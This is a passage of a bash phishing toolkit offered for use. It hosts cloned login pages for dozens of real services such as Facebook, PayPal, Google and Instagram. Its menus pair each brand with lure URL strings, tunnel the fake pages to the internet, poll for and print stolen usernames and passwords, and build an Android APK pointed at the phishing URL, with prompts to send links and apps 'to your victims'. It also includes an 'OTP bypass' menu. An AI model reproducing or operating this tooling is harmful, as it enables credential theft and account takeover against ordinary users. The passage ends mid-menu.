LCwsLCwsLCwsLCwsLCwsKiwsLCwsLC4gICAKICAgICAgICAgICAgICAgICwsLCwsLCwsLCwsLCwsLComQCYmJiZAKiwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwuLCwsLC4gICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwuICAgICAgICAgICAgICAgICAgICAKIiIiCmJhbm5lcjg9ZiIiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJSYgKCAgICAgICAgICUgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICUmLyAgICAgICAgICAgICAgICAgICAgJSAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKCMqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICMsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAlKCwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBAICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgJiojKkAgICAgICwjICwqKiAgLCYuICxALy8lICAgICAgICAgICAgICAqICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICYvLyMoKCAmLy8qKiooLC5ALyovKioqKi8jJiMoICAgICAgICAgICAgIC4gICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICUmKC8oIyYoLy8mKi8vKC8vJSBALCYvKi8qJi9AJi8gICAgICAgICAgICAgLiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICMvLyMmJSUoLy8oKioqKioqKiovKioqKiooL0AmKC4gICAgICAgICAgLiAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgKi8vLyMjLy8oLy8oLy8oKCovLy8qLy8uKigjQCYoIyggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAqLygjKCgvLy8jJSNAKCgoKC8vKioqKiMvIyUlIy9ALyoqKEAgIC4gICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgIC4vLy8jQC8vLy8oKEAvIygoKCgoKioqKiovKCgoKCgmIC4gICwgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICUvIyMmKC8vQCMjJigjQEAoKCMoQCgoKCgoKCgoKCAgICAgICAgICAgICAgICAgICYqIC4gICAgICAgICAgICAgIAogICAgICAgICAgICAgICAvLyMlIy8jIy8mIy8vLyMvLy8vLygoQCUlJi8uICAgICAgICAgICAgICAgICAgICAgJSpAICAgICAgICAgICAgIAogICAgICAgICAgICAgIC4vLy8jKCMvKCMoKCMvLygvIy8vKi8vJi8vQC8gICAgICAgICAgICAgICAgICAgKiomICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgKiYjJiMoLy8oJSUvLyMvKC8vKC8vLy8vLy8gICAgICAlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICwvQC8jIyMjIygoLy8vJiMvLy9AJiMvLyYgICAgICAgIC4gICAgICAgICAuICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAmLygoIyMjIyMoKCgoKCgoLyYjKCglICAgICAgICAgICAgICAgLiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICYjIyMjIyMjKCgoKCgqJiMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgIyMjQEAoKCgqIy9ALy8sICAgQCwsLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICYvL0AvLyUjQCgoKiAgICAlLy8vJSMqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgLygvLy8vLCAgLyMjJigjIyMvLyNAJiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICUlQCAgICAgICAgIyMjKCMoLy8qICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqLyMoLy8vICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAlLy8vKC8vICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBALy8vLyUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIywgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoiIiIKYmFubmVyOT1mIiIiCgogKCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKiAgICAgICAgICAgICAgICAgIAogKVwgKSAgICAgICAgICAgICApICAgICAgKSAgICAgICggIGAgICAgICAgICAgICAgICAgIAooKCkvKCAgKCAgICAgICAoIC8oICAgKCAvKCAoICAgIClcKSkoICAgICAgKSAgICAgICAgIAogLyhfKSkgKVwgICggICApXCgpKSAgKVwoKSkpKCAgKChfKSgpXCAgKCAvKCAgICggICAgIAooXykpX3woKF8pIClcICgoXylcICAoKF8pXCgoKVwgKF8oKSgoXykgKShfKSkgIClcICkgIAp8IHxfICAgKF8pKChfKXwgfChfKXxfXyAoXykoKF8pfCAgXC8gIHwoKF8pXyAgXyhfLyggIAp8IF9ffCAgfCB8KF8tPHwgJyBcICB8XyBcIHwgJ198fCB8XC98IHwvIF9gIHx8ICcgXCkpIAp8X3wgICAgfF98L19fL3xffHxffHxfX18vIHxffCAgfF98ICB8X3xcX18sX3x8X3x8X3xHaG9zdGh1YiAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoiIiIKYmFubmVyMTA9ZiIiIgoKKWAtLi0tLiAuJyggICAgKVwuLS0uICAgICAgIC4nKCAgIC4tLS0uLyggICAgIC9gLS4gICApXCAgIClcICAgICAvYC0uICAgIClcICApXCAgCikgLC0uXyggXCAgKSAgKCAgIC5fLicgICwnKSBcICApIChfLi0sICAgKSAgLCcgXyAgXCAoICAnLC8gLyAgICwnIF8gIFwgICggIFwsIC8gIApcIGAtLl8gICkgKCAgICBgLS5gLiAgICggICctJyAoICAgICwtYCAgLyAgKCAgJy0nICggICkgICAgKCAgICggICctJyAoICAgKSBcICggICAKICkgLF8oICBcICApICAsXyAoICBcICAgKSAuLS4gICkgIF8nLSwgKCAgICApICxfIC4nICggIFwoXCBcICAgKSAgIF8gICkgKCAoIFwgXCAgCiggIFwgICAgICkgXCAoICAnLikgICkgKCAgLCAgKSBcICApYC0nICApICAoICAnICkgXCAgYC4pIC8gICkgKCAgLCcgKSBcICBgLikvICApIAogKS4nICAgICAgKS8gICcuXyxfLicgICApLyAgICApLyAgYC5fLi4oICAgICkvICAgKS8gICAgICAnLiggICApLyAgICApLyAgICAgJy4oICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiIiIgoKcmFuZG9tQmFubmVyID0gcmFuZG9tLnJhbmRpbnQoMSwgMTApCmlmIHJhbmRvbUJhbm5lciA9PSAxOgogICAgcHJpbnQoYmFubmVyMSkKZWxpZiByYW5kb21CYW5uZXIgPT0gMjoKICAgIHByaW50KGJhbm5lcjIpCmVsaWYgcmFuZG9tQmFubmVyID09IDM6CiAgICBwcmludChiYW5uZXIzKQplbGlmIHJhbmRvbUJhbm5lciA9PSA0OgogICAgcHJpbnQoYmFubmVyNCkKZWxpZiByYW5kb21CYW5uZXIgPT0gNToKICAgIHByaW50KGJhbm5lcjUpCmVsaWYgcmFuZG9tQmFubmVyID09IDY6CiAgICBwcmludChiYW5uZXI2KQplbGlmIHJhbmRvbUJhbm5lciA9PSA3OgogICAgcHJpbnQoYmFubmVyNykKZWxpZiByYW5kb21CYW5uZXIgPT0gODoKICAgIHByaW50KGJhbm5lcjgpCmVsaWYgcmFuZG9tQmFubmVyID09IDk6CiAgICBwcmludChiYW5uZXI5KQplbGlmIHJhbmRvbUJhbm5lciA9PSAxMDoKICAgIHByaW50KGJhbm5lcjEwKSAgICAKZWxzZToKICAgIHBhc3M='))
EOF
)

python3 -c "$HAX"

}

tunnel_otp() {
	{ clear; header; }
printf "\e[1;3$(( $RANDOM * 6 / 32767 + 1 ))m"
echo "
+---------+-----------+---------+---------------+---------+-------------+
| options |  tunnel   | options |    tunnel     | options |   tunnel    |
+---------+-----------+---------+---------------+---------+-------------+
|    1    | Localhost |    2    | Localhost Run |    3    | Cloudflared |
+---------+-----------+---------+---------------+---------+-------------+
"

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in 
		   1)
		    localhost_starter;;
		    
		   2)
		    localhostrun_starter;; 
			
		   3)
			cloudflared_starter;;
			
		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again...$RESET"
			{ sleep 1; header; tunnel;};;
	esac

}

function otp_bypass() {
 { clear; header; echo; }
printf "\e[1;3$(( $RANDOM * 6 / 32767 + 1 ))m"
echo "
+---------+--------------+---------+-------------+
| Options |   Website    | Options |   Website   |
+---------+--------------+---------+-------------+
|    1    |     eBay     |    2    |  Facebook   |
+---------+--------------+---------+-------------+
|    3    |   Flipcart   |    4    |   Github    |
+---------+--------------+---------+-------------+
|    5    |    Google    |    6    |   Hotstar   |
+---------+--------------+---------+-------------+
|    7    |  Instagram   |    8    |  Linkedin   |
+---------+--------------+---------+-------------+
|    9    |   Mobikwik   |   10    |   Netflix   |
+---------+--------------+---------+-------------+
|   11    |    Paypal    |   12    | Paytm Login |
+---------+--------------+---------+-------------+
|   13    | Paytm Signup |   14    |  Phonepay   |
+---------+--------------+---------+-------------+
|   15    |   Snapchat   |   16    |  Telegram   |
+---------+--------------+---------+-------------+
|   17    |    Tiktok    |   18    |   Twitch    |
+---------+--------------+---------+-------------+
|   19    |   Twitter    |   20    |    Uber     |
+---------+--------------+---------+-------------+
|   21    |   Whatsapp   |   22    |   Zomato    |
+---------+--------------+---------+-------------+
"
read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in 
	
	    1)
			web="ebay"
			subdomain='http://ebay-online-shopping-discount'
			tunnel_otp;;
				
				
	    2)
			site="facebook"
			subdomain='http://fb-watchtv/viral-girl'
			tunnel_otp;;				
			
			
        3)
			web="flipcart"
			subdomain='http://get-free-coin&membership'
			tunnel_otp;;
			
			
		4)
			web="github"
			subdomain='http://github/car-hacking'
			tunnel_otp;;	
			
			
	    5)
			web="google"
			subdomain='http://get-free-internship-from-google-resigter-here'
			tunnel_otp;;	
	 		
	 		
	    6)
			web="hotstar"
			subdomain='http://get-free-member-watch-your-favorite-show'
			tunnel_otp;;
		
		
		7)
			web="instagram"
			subdomain='http://promote-your-profile'
			tunnel_otp;;
		
		
		8)
			web="linkedin"
			subdomain='http://get-quick-job&internship'
			tunnel_otp;;
		
		
		9)
			web="mobikwik"
			subdomain='http://refer&earn-cashback-free'
			tunnel_otp;;
					
			
		10)
			web="netflix"
			subdomain='http://free-netflix-membership'
			tunnel_otp;;	


        11)
			web="paypal"
			subdomain='http://transfer-money-easily'
			tunnel_otp;;


		12)
		    web="paytm_login"
			subdomain='http://secure_payment_now&earn_cashback'
			tunnel_otp;;	
			
			
		13)
			web="paytm_signup"
			subdomain='http://secure_payment_now&earn_cashback'
			tunnel_otp;; 	
			
          
        14)
            web="phonepay"
			subdomain='http://easily_transfer_your_money_unlimited_upi'
			tunnel_otp;;  

	     
	    15)		
	 		web="snapchat"
			subdomain='http://customize_your_selfie_byUnlimited&filters'
			tunnel_otp;;
			
			
	    16)		
	 		web="telegram"
			subdomain='http://t-me-join-technology&World'
			tunnel_otp;;
	   		
	   		
	    17)
			web="tiktok"
			subdomain='http://create&upload-your-videos'
			tunnel_otp;;		
	   		
	   	
	   	18)
			web="twitch"
			subdomain='http://unlimited-twitch-tv-user-for-free'
			tunnel_otp;;		
	   	
	   	
	   	19)
			web="twiter"
			subdomain='http://get-blue-badge-on-twitter-free'
			tunnel_otp;;
			
		20)
		    web="uber"
			subdomain='http://get-free-ride'
			tunnel_otp;;			
			
	    21)
			web="whatsapp"
			subdomain='http://create-whatsapp-account&byEmailid'
			tunnel_otp;;
			
			
	    22)
			web="zomato"
			subdomain='http://get-free-pizza&luckyWinner'
			tunnel_otp;;		
		
		*)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; otp_bypass;};;
	  
	esac
	
}

# Php webserver and port 
host='127.0.0.1'
port='8080'


setup_clone(){
	
    # Setup cloned page and server
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up pages..."${WHITE}
	rm -rf .www/*
	cp -rf .pages/"$site"/* .www
	server Starting your php server... 3
	cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 
}

# Get credentials from victims
get_creds() {
	ACC=$(grep -o 'Username:.*' .www/data.txt | cut -d " " -f2)
	PASS=$(grep -o 'Password:.*' .www/data.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Account : ${WHITE}$ACC"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Password : ${WHITE}$PASS"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Saved in : ${ORANGE}data.txt"
	cat .www/data.txt >> data.txt
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Next Fingerptints and Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

# Print credentials from victim
credentials() {
	
   echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Victim Login Info.. ${BLUE}Ctrl + C ${MAGENTA}to exit..."
	
	while true; do
	
		if [[ -e ".www/data.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Login info Found !"
			get_creds
			rm -rf .www/data.txt
		fi
		
		sleep 0.75
		
	done
}

# Localhost Start
localhost_start() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
	setup_clone
	{ sleep 1; clear; header; }
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
	credentials
}

# Start Cloudflared
# 
cloudflared_start() { 
    
    check_connection
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
	{ sleep 1; setup_clone; }
	server Launching Cloudflared... 3
	
    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi
	
	{ sleep 9; clear; header; }
	
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
	cldflr_url1=${cldflr_url#https://}
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
	sleep 3
	echo -e "[≠] $MAGENTA Copy the Link & Send To Your Victim $RESET"
	sleep 4
	url_mask
}


# Start localrun
localhostrun_start() {
    
    check_connection
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone; }
	server Launching LocalhostRun... 3
   
    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi
    
	{ sleep 9; clear; header; }
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
	localrun_url1=${localrun_url#https://}
    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
	credentials
}


function Main_Activity() {
change_xml=".lib/res/values/strings.xml" 
ap=$(egrep -i 'app_name' $change_xml )
n1=$(echo $ap | cut -f2 -d ">")
n2=$(echo "$n1" | awk -F'<' '{print $1}')
echo -ne "$RED[?]$BLUE Enter APP Name : $RESET"
read name
if [[ ! -z $name ]];then
cat <<EOF > $change_xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="appbar_scrolling_view_behavior">android.support.design.widget.AppBarLayout$ScrollingViewBehavior</string>
    <string name="bottom_sheet_behavior">android.support.design.widget.BottomSheetBehavior</string>
    <string name="character_counter_pattern">%1$d / %2$d</string>
    <string name="abc_action_bar_home_description">Navigate home</string>
    <string name="abc_action_bar_home_description_format">%1$s, %2$s</string>
    <string name="abc_action_bar_home_subtitle_description_format">%1$s, %2$s, %3$s</string>
    <string name="abc_action_bar_up_description">Navigate up</string>
    <string name="abc_action_menu_overflow_description">More options</string>
    <string name="abc_action_mode_done">Done</string>
    <string name="abc_activity_chooser_view_see_all">See all</string>
    <string name="abc_activitychooserview_choose_application">Choose an app</string>
    <string name="abc_capital_off">OFF</string>
    <string name="abc_capital_on">ON</string>
    <string name="abc_search_hint">Search…</string>
    <string name="abc_searchview_description_clear">Clear query</string>
    <string name="abc_searchview_description_query">Search query</string>
    <string name="abc_searchview_description_search">Search</string>
    <string name="abc_searchview_description_submit">Submit query</string>
    <string name="abc_searchview_description_voice">Voice search</string>
    <string name="abc_shareactionprovider_share_with">Share with</string>
    <string name="abc_shareactionprovider_share_with_application">Share with %s</string>
    <string name="abc_toolbar_collapse_description">Collapse</string>
    <string name="search_menu_title">Search</string>
    <string name="status_bar_notification_info_overflow">999+</string>
    <string name="abc_font_family_body_1_material">sans-serif</string>
    <string name="abc_font_family_body_2_material">sans-serif-medium</string>
    <string name="abc_font_family_button_material">sans-serif-medium</string>
    <string name="abc_font_family_caption_material">sans-serif</string>
    <string name="abc_font_family_display_1_material">sans-serif</string>
    <string name="abc_font_family_display_2_material">sans-serif</string>
    <string name="abc_font_family_display_3_material">sans-serif</string>
    <string name="abc_font_family_display_4_material">sans-serif-light</string>
    <string name="abc_font_family_headline_material">sans-serif</string>
    <string name="abc_font_family_menu_material">sans-serif</string>
    <string name="abc_font_family_subhead_material">sans-serif</string>
    <string name="abc_font_family_title_material">sans-serif-medium</string>
    <string name="app_name">$name</string>
    <string name="action_settings">Settings</string>
</resources>
EOF
   echo -e "$ORANGE[-]$GREEN Set Name To $name $RESET"
else
    echo -e "$RED [!] Please Enter Valid App Name!! $RED"
    Main_Activity
    fi
echo -ne "$RED[?]$BLUE Enter Output APP Name : $RESET"
read output
if [[ ! -z $output ]];then
   echo -e "$ORANGE[-]$GREEN Set Output Name To $output.apk $RESET"
else
    echo -e "$RED Please Mention Output Name!! $RED"
    Main_Activity
    fi   
}

apktool_build() {
Main_Activity    
echo -e "[+]$GREEN Set-up Apk Maven Library...$RESET" 
sleep 2  
activity=".lib/smali/id/web/aiueo/androidsplashscreen/MainActivity.smali"
ex=$(egrep -i 'http|https|www' $activity)
c1=$(echo $ex | cut -f2 -d ",")
c2=$(echo $c1 | awk '{print substr($0,2)}')
c3=$(echo "$c2" | awk -F'"' '{print $1}')
sed -i "s|$c3|""$cldflr_url1"'|g' $activity
sleep 3
echo -e "[+]$GREEN Building Apk! Please Wait...$reset"
apps="$PWD/.lib"
apktool b -f $apps -q -o "${output}.apk"
echo -e "$BLUE"
process 12
if [ -e $output ];then
    echo -e "$RESET[+]$GREEN Apk Saved : $BLUE $output.apk"
    echo -e "[-]$CYAN Apk Path : $RESET $PWD"
    sleep 1
    echo -e "[!]$RED If You're Faceing Error to install the Apk \n $ORANGE First of all Sign The Apk Perfectly $RESET"
    echo -e "[-]$CYAN Send Apk to your victims$RESET"
    sleep 2.5
    credentials
else 
    echo -e "$RED Failed to build Apk $RESET"
    Main_Activity
fi
}

apktool_Check() {
    Apkg="apktool"
    which $Apkg >/dev/null 2>&1
    if [ $? == 0 ];then
    apktool_build
    else
       echo -ne "$RED [!] apktool Not Found!$GREEN Install [y/n] : $RESET"
       read Install 
       if [[ $Install == "y" || $Install == "y" ]];then
       apt install $Apkg -y
       sleep 0.5
       version=$(apktool --version)
       echo -e "[+]$GREEN apktool version :$ORANGE $version $RESET"
       sleep 2
       else 
       echo -e "$RED[!] Something Wents Wrong $RESET"
       apktool_Check
    fi
fi   
}

apktool_builder() {
Main_Activity    
echo -e "[+]$GREEN Set-up Apk Maven Library...$RESET" 
sleep 2  
activity=".lib/smali/id/web/aiueo/androidsplashscreen/MainActivity.smali"
ex=$(egrep -i 'http|https|www' $activity)
c1=$(echo $ex | cut -f2 -d ",")
c2=$(echo $c1 | awk '{print substr($0,2)}')
c3=$(echo "$c2" | awk -F'"' '{print $1}')
sed -i "s|$c3|""$cldflr_url1"'|g' $activity
sleep 3
echo -e "[+]$GREEN Building Apk! Please Wait...$reset"
apps="$PWD/.lib"
apktool b -f $apps -q -o "${output}.apk"
echo -e "$BLUE"
process 12
if [ -e $output ];then
    echo -e "$RESET[+]$GREEN Apk Saved : $BLUE $output.apk"
    echo -e "[-]$CYAN Apk Path : $RESET $PWD"
    sleep 1
    echo -e "[!]$RED If You're Faceing Error to install the Apk \n $ORANGE First of all Sign The Apk Perfectly $RESET"
    echo -e "[-]$CYAN Send Apk to your victims$RESET"
    sleep 2.5
    otp_data
else 
    echo -e "$RED Failed to build Apk $RESET"
    Main_Activity
fi
}

apktool_Checker() {
    Apkg="apktool"
    which $Apkg >/dev/null 2>&1
    if [ $? == 0 ];then
    apktool_builder
    else
       echo -ne "$RED [!] apktool Not Found!$GREEN Install [y/n] : $RESET"
       read Install 
       if [[ $Install == "y" || $Install == "y" ]];then
       apt install $Apkg -y
       sleep 0.5
       version=$(apktool --version)
       echo -e "[+]$GREEN apktool version :$ORANGE $version $RESET"
       sleep 2
       else 
       echo -e "$RED[!] Something Wents Wrong $RESET"
       apktool_Checker
    fi
fi   
}


# Select Tunnel  
tunnel() {
	{ clear; header; }
printf "\e[1;3$(( $RANDOM * 6 / 32767 + 1 ))m"
echo "
+---------+-----------+---------+---------------+---------+-------------+
| options |  tunnel   | options |    tunnel     | options |   tunnel    |
+---------+-----------+---------+---------------+---------+-------------+
|    1    | Localhost |    2    | Localhost Run |    3    | Cloudflared |
+---------+-----------+---------+---------------+---------+-------------+
"

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in 
		   1)
		    localhost_start;;
		    
		   2)
		    localhostrun_start;; 
			
		   3)
			cloudflared_start;;
			
		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 1; header; tunnel;};;
	esac

}

attack() {
 
 { clear; header; echo; }
printf "\e[1;3$(( $RANDOM * 6 / 32767 + 1 ))m"
echo "
+---------+-------------------------+---------+---------------------+
| Options |         Website         | Options |       Website       |
+---------+-------------------------+---------+---------------------+
|    1    |          adobe          |    2    |       amazon        |
+---------+-------------------------+---------+---------------------+
|    3    |          apple          |    4    |        Badoo        |
+---------+-------------------------+---------+---------------------+
|    5    |          Care2          |    6    |   Clash Of Clans    |
+---------+-------------------------+---------+---------------------+
|    7    |       Crunchyroll       |    8    |     Deviantart      |
+---------+-------------------------+---------+---------------------+
|    9    |         Discord         |   10    |        Dota2        |
+---------+-------------------------+---------+---------------------+
|   11    |         Dropbox         |   12    |        ebay         |
+---------+-------------------------+---------+---------------------+
|   13    |        Facebook         |   14    | Facebook Massenger  |
+---------+-------------------------+---------+---------------------+
|   15    |    FacebookSecurity     |   16    |        Gmail        |
+---------+-------------------------+---------+---------------------+
|   17    |        Goodreads        |   18    |       Hotstar       |
+---------+-------------------------+---------+---------------------+
|   19    |         iCloud          |   20    |     Influenster     |
+---------+-------------------------+---------+---------------------+
|   21    |        Instagram        |   22    | Instagram Followers |
+---------+-------------------------+---------+---------------------+
|   23    | Instagram Followers Adv |   24    |  Instagram Verify   |
+---------+-------------------------+---------+---------------------+
|   25    |          Line           |   26    |      LinkedIn       |
+---------+-------------------------+---------+---------------------+
|   27    |       Livejournal       |   28    |      mediafire      |
+---------+-------------------------+---------+---------------------+
|   29    |          mewe           |   30    |      Microsoft      |
+---------+-------------------------+---------+---------------------+
|   31    |        mocospace        |   32    |       myspace       |
+---------+-------------------------+---------+---------------------+
|   33    |         Netflix         |   34    |       Origin        |
+---------+-------------------------+---------+---------------------+
|   35    |         Outlook         |   36    |      Pinterest      |
+---------+-------------------------+---------+---------------------+
|   37    |       PlayStation       |   38    |     Protonmail      |
+---------+-------------------------+---------+---------------------+
|   39    |          PubG           |   40    |        Quora        |
+---------+-------------------------+---------+---------------------+
|   41    |         raverly         |   42    |       reddit        |
+---------+-------------------------+---------+---------------------+
|   43    |      reverbnation       |   44    |       Signal        |
+---------+-------------------------+---------+---------------------+
|   45    |          Skype          |   46    |       skyrock       |
+---------+-------------------------+---------+---------------------+
|   47    |        Snapchat         |   48    |     Socialclub      |
+---------+-------------------------+---------+---------------------+
|   49    |         Spotify         |   50    |    Stackoverflow    |
+---------+-------------------------+---------+---------------------+
|   51    |          Steam          |   52    |       Tagget        |
+---------+-------------------------+---------+---------------------+
|   53    |        Telegram         |   54    |       tiktok        |
+---------+-------------------------+---------+---------------------+
|   55    |    tiktok Followers     |   56    |       Tumblr        |
+---------+-------------------------+---------+---------------------+
|   57    |         twitch          |   58    |       Twitter       |
+---------+-------------------------+---------+---------------------+
|   59    |        Viver Out        |   60    |        vimeo        |
+---------+-------------------------+---------+---------------------+
|   61    |           VK            |   62    |      Whatsapp       |
+---------+-------------------------+---------+---------------------+
|   63    |        WordPress        |   64    |        Xanga        |
+---------+-------------------------+---------+---------------------+
|   65    |          Xbox           |   66    |        Xing         |
+---------+-------------------------+---------+---------------------+
|   67    |          Yahoo          |   68    |       Yandex        |
+---------+-------------------------+---------+---------------------+
|   69    |         YouTube         |   70    |       Paypal        |
+---------+-------------------------+---------+---------------------+
|   71    |       Google-Poll       |   72    |   Cryptocurrency    |
+---------+-------------------------+---------+---------------------+
|   73    |         Github          |   74    |       Gitlab        |
+---------+-------------------------+---------+---------------------+

"
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in 
	
	    1)
			site="adobe"
			subdomain='http://adobe-pro-membership-lifetime-for-you'
			tunnel;;
			
			
	    2)
			site="amazon"
			subdomain='http://amazon-pro-membership-lifetime-for-you'
			tunnel;;
				
				
	    3)
			site="apple"
			subdomain='http://apple-security-account-login'
			tunnel;;				
			
			
        4)
			site="badoo"
			subdomain='http://get-2000-euro-free-for-your-acount'
			tunnel;;
			
			
		5)
			site="care2"
			subdomain='http://get-2000-tokens-free-for-your-acount'
			tunnel;;	
			
			
	    6)
			site="clashofclans"
			subdomain='http://get-free-character-for-clashofclans-game'
			tunnel;;	
	 		
	 		
	    7)
			site="crunchyroll"
			subdomain='http://get-free-character-for-crunchyroll-game'
			tunnel;;
		
		
		8)
			site="deviantart"
			subdomain='http://deviantart-upgrade-account-pro-for-free'
			tunnel;;
		
		
		9)
			site="discord"
			subdomain='http://discord-upgrade-account-pro-for-free'
			tunnel;;
		
		
		10)
			site="dota2"
			subdomain='http://dota-upgrade-account-pro-for-free'
			tunnel;;
					
			
		11)
			site="dropbox"
			subdomain='http://get-2TB-cloud-storage-free'
			tunnel;;	


        12)
			site="ebay"
			subdomain='http://ebay-upgrade-account-for-free'
			tunnel;;


		13)
		    site="facebook"
			subdomain='http://secure-verified-account-for-facebook'
